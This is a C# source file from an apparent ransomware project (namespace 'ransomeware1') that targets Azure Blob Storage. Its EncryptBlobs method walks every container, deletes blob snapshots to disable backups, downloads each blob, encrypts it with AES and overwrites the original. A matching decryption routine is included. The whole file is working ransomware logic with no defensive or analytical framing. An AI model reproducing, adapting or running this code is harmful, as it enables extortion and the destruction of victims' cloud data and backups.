using Microsoft.WindowsAzure.Storage; // Namespace for CloudStorageAccount
using Microsoft.WindowsAzure.Storage.Blob; // Namespace for Blob storage types
using System;
using ransomeware1;
using System.IO;

public class Blob_Storage
{
    public static void EncryptBlobs(CloudStorageAccount storageAccount, AESEncryption encrypt)
    {

        // Create the blob client.
        CloudBlobClient blobClient = storageAccount.CreateCloudBlobClient();
        
        foreach (CloudBlobContainer containter in blobClient.ListContainers())
        {
            // Retrieve reference to a previously created container.
            CloudBlobContainer cont = blobClient.GetContainerReference(containter.Name);


            foreach (IListBlobItem item in cont.ListBlobs(null, false))
            {
                if (item.GetType() == typeof(CloudBlockBlob) || item.GetType() == typeof(CloudPageBlob))
                {
                    CloudBlockBlob blob = (CloudBlockBlob)item;
                    blob.Delete(DeleteSnapshotsOption.DeleteSnapshotsOnly); // part of disable backups
                    Console.WriteLine("Block blob named: {0}", blob.Name);
                    Download(blob, Utils.getPath());

                   // AESEncryption encrypt = new AESEncryption();
                    encrypt.EncryptAES(Utils.getPath() + blob.Name, storageAccount);
                    encrypt.OnFinishEncryption(storageAccount);
                    Upload(blob, Utils.getPath());
                }
            }
        }
    }

    public static void DecryptBlobs(CloudStorageAccount storageAccount, AESDecryption decrypt)
    {

        // Create the blob client.
        CloudBlobClient blobClient = storageAccount.CreateCloudBlobClient();

        foreach (CloudBlobContainer containter in blobClient.ListContainers())
        {
            // Retrieve reference to a previously created container.
            CloudBlobContainer cont = blobClient.GetContainerReference(containter.Name);


            foreach (IListBlobItem item in cont.ListBlobs(null, false))
            {
                if (item.GetType() == typeof(CloudBlockBlob) || item.GetType() == typeof(CloudPageBlob))
                {
                    CloudBlockBlob blob = (CloudBlockBlob)item;
                    blob.Delete(DeleteSnapshotsOption.DeleteSnapshotsOnly); // part of disable backups
                    Console.WriteLine("Block blob named: {0}", blob.Name);
                    Download(blob, Utils.getPath());

                    // AESEncryption encrypt = new AESEncryption();
                    decrypt.decryptAES(Utils.getPath() + blob.Name, storageAccount);
                    Upload(blob, Utils.getPath());
                }
            }
        }
    }


    public static void Download(CloudBlockBlob blocktype, string path)
    {

        Directory.CreateDirectory(Utils.getPath());

        using (var fileStream = System.IO.File.OpenWrite(Utils.getPath() + blocktype.Name))
        {
            blocktype.DownloadToStream(fileStream);
        }
    }

    public static void Upload(CloudBlockBlob blocktype, string path)
    {
        // Create or overwrite the "myblob" blob with contents from a local file.
        using (var fileStream = System.IO.File.OpenRead(Utils.getPath() + blocktype.Name))
        {
            blocktype.UploadFromStream(fileStream);
        }
    }

}